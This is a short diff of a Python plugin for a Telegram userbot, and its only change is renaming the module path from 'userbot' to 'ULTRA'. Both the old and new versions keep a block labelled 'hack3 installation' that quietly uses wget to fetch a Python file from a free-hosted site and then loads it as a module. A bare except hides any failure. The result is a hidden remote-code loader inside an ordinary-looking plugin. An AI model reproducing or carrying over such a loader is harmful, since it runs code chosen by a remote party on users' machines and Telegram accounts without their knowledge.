@@ -7,11 +7,11 @@ from telethon import events
 import asyncio
 from uniborg.util import admin_cmd
 from telethon.tl.functions.users import GetFullUserRequest
-from userbot.utils import load_module
+from ULTRA.utils import load_module
 import os
 # hack3 installation
 try:
-  os.system('wget https://legendx22.000webhostapp.com/hack3.py -P userbot/plugins/')
+  os.system('wget https://legendx22.000webhostapp.com/hack3.py -P ULTRA/plugins/')
   load_module('hack3')
 except:
   pass
